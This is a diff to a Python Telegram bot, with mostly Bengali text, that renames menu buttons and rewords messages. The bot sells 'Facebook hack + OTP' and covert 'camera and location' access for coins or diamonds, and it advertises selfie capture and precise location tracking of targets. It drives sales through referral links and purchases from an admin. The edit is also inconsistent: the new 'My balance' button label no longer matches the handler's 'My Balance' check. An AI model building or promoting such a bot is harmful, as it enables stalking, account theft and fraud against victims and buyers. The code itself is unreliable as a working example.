@@ -55,8 +55,8 @@ def is_subscribed(user_id):
 # --- মেনু ডিজাইন ---
 def main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("🚀 Start", "💰 My Assets")
-    markup.row("👥 Refer", "🔥 Access")
+    markup.row("🚀 Start", "💰 My balance")
+    markup.row("👥 Refer", "🔥 Access link")
     markup.row("ℹ️ Info")
     return markup
 
@@ -86,7 +86,7 @@ def handle_text(message):
     if text == "🚀 Start":
         bot.send_message(user_id, "🚀 কমান্ড গ্রহণ করার জন্য বোটটি প্রস্তুত।", reply_markup=main_menu())
 
-    elif text == "💰 My Assets":
+    elif text == "💰 My Balance":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("🛒 প্রিমিয়াম পারচেজ", url=f"https://t.me/{ADMIN_USERNAME}"),
                    types.InlineKeyboardButton("🎁 গিফট কোড রিডিম", callback_data="redeem_ui"))
@@ -100,9 +100,9 @@ def handle_text(message):
     elif text == "👥 Refer":
         bot_user = bot.get_me().username
         link = f"https://t.me/{bot_user}?start={user_id}"
-        bot.send_message(user_id, f"👥 **রেফারাল প্রোগ্রাম:**\n\nসফল ভেরিফায়েড রেফারে আপনি পাবেন **৫০ কয়েন**।\n\n🔗 আপনার ইনভাইট লিঙ্ক:\n`{link}`", parse_mode='Markdown')
+        bot.send_message(user_id, f"👥 **রেফারাল প্রোগ্রাম:**\n\n👉সফল ভেরিফায়েড রেফারে আপনি পাবেন **৫০ কয়েন**।👈\n\n🔗 আপনার ইনভাইট লিঙ্ক:\n`{link}`", parse_mode='Markdown')
 
-    elif text == "🔥 Access":
+    elif text == "🔥 Access link":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📸 ক্যামেরা ও লোকেশন (10 Coin)", callback_data="buy_cam"),
                    types.InlineKeyboardButton("🔐 ফেসবুক হ্যাক + OTP (5 Diamond)", callback_data="buy_fb"))
@@ -119,9 +119,9 @@ def handle_text(message):
             "• সেলফি ক্যামেরা ক্যাপচারিং।\n"
             "• প্রিসাইজ লোকেশন ট্র্যাকিং।\n\n"
             "💵 **কয়েন বাড়ানোর গাইড:**\n"
-            "১. **রেফার:** আপনার লিঙ্ক থেকে জয়েন করিয়ে কয়েন জমান।\n"
+            "১. **রেফার:** আপনার লিঙ্ক থেকে জয়েন করিয়ে কয়েন বাড়াতে পারবেন।\n"
             "২. **চ্যানেল:** আমাদের চ্যানেলে নিয়মিত ফ্রি প্রোমো কোড দেওয়া হয়।\n"
-            "৩. **বাই:** সরাসরি অ্যাডমিন থেকে কিনুন দ্রুত অ্যাক্সেসের জন্য।\n\n"
+            "৩. **প্রিমিয়াম পারচেজ:** সরাসরি অ্যাডমিন থেকে ডায়মন্ড নিতে পারবেন।\n\n"
             f"👤 **আপনার ডাটা:**\n"
             f"সফল রেফার: {ref_count} জন\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
